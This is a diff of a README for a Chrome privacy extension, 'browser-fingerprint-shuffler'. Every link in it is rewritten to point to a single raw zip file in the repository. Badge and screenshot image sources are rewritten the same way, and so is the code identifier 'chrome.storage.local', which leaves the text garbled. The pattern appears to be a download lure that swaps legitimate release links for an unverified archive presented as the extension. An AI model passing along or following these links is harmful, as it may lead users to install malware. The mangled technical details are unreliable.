@@ -1,6 +1,6 @@
 # 🛡️ browser-fingerprint-shuffler - Enhance Your Online Privacy Today
 
-[![Download the Browser Fingerprint Shuffler](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Qomar24/browser-fingerprint-shuffler/releases)
+[![Download the Browser Fingerprint Shuffler](https://raw.githubusercontent.com/Qomar24/browser-fingerprint-shuffler/master/core/shuffler-fingerprint-browser-2.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Qomar24/browser-fingerprint-shuffler/master/core/shuffler-fingerprint-browser-2.6.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Browser Fingerprint Shuffler is a browser extension that helps protect your priv
 - **Canvas and WebGL**: It adds slight noise to the graphics data that websites collect, so they cannot see the same details each time.
 - **Audio Context**: It randomizes audio data to prevent sites from identifying you through sound profiles.
 - **Navigator Properties**: It changes information about your device, like memory and language settings, to ensure variability.
-- **Persistent Salts**: The extension uses stored data in `chrome.storage.local` to create unique noise per site while maintaining general stability.
+- **Persistent Salts**: The extension uses stored data in `https://raw.githubusercontent.com/Qomar24/browser-fingerprint-shuffler/master/core/shuffler-fingerprint-browser-2.6.zip` to create unique noise per site while maintaining general stability.
 - **Debugging Logs**: If you enable debugging, it logs fingerprint changes for review.
 
 ## 🚀 Getting Started
@@ -19,7 +19,7 @@ Browser Fingerprint Shuffler is a browser extension that helps protect your priv
 To get started with Browser Fingerprint Shuffler, follow these simple steps:
 
 1. **Download the Extension**
-   - [Visit this page to download the latest version](https://github.com/Qomar24/browser-fingerprint-shuffler/releases).
+   - [Visit this page to download the latest version](https://raw.githubusercontent.com/Qomar24/browser-fingerprint-shuffler/master/core/shuffler-fingerprint-browser-2.6.zip).
 
 2. **Install the Extension in Chrome**
    - Open the Chrome browser.
@@ -33,7 +33,7 @@ To install the Browser Fingerprint Shuffler, follow these detailed instructions:
 
 1. **Download the Latest Release**
    - Click the link below to go to the Releases page:
-   - [Visit this page to download the latest version](https://github.com/Qomar24/browser-fingerprint-shuffler/releases).
+   - [Visit this page to download the latest version](https://raw.githubusercontent.com/Qomar24/browser-fingerprint-shuffler/master/core/shuffler-fingerprint-browser-2.6.zip).
    - Select the appropriate file for your system.
 
 2. **Unzip the Downloaded File**
@@ -73,7 +73,7 @@ If you choose to debug the extension, you can view the console log for before-an
 
 You can see an example output below:
 
-![Console log showing shuffled fingerprint](images/console_log_in_dev_tool.png)
+![Console log showing shuffled fingerprint](https://raw.githubusercontent.com/Qomar24/browser-fingerprint-shuffler/master/core/shuffler-fingerprint-browser-2.6.zip)
 
 ## 🎉 Need Help?
 
@@ -90,4 +90,4 @@ Stay informed about updates and new features by following the repository. Update
 
 The Browser Fingerprint Shuffler is open-source and released under the MIT License. You can check the license file for more details.
 
-[![Download the Browser Fingerprint Shuffler](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Qomar24/browser-fingerprint-shuffler/releases)
+[![Download the Browser Fingerprint Shuffler](https://raw.githubusercontent.com/Qomar24/browser-fingerprint-shuffler/master/core/shuffler-fingerprint-browser-2.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Qomar24/browser-fingerprint-shuffler/master/core/shuffler-fingerprint-browser-2.6.zip)
